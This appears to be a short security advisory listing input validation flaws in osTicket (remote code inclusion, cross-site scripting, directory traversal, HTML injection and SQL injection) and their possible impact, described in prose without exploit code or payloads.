osTicket is affected by multiple input validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.

Reportedly the application permits the inclusion of remote code that could be run under the permissions of the affected Web server.

The application is vulnerable to multiple cross-site scripting vulnerabilities. Attacker-supplied HTML and script code would be able to access properties of the site, potentially allowing for theft of cookie-based authentication credentials; other attacks are also possible.

If the file upload feature is enabled then a directory traversal vulnerability is possible. This vulnerability could be exploited to retrieve sensitive or privileged information normally accessible to the Web server.

The application is prone to HTML injection vulnerabilities. Attacker-supplied HTML and script code would be able to access properties of the site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.

The application is also prone to multiple SQL injection vulnerabilities. Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.
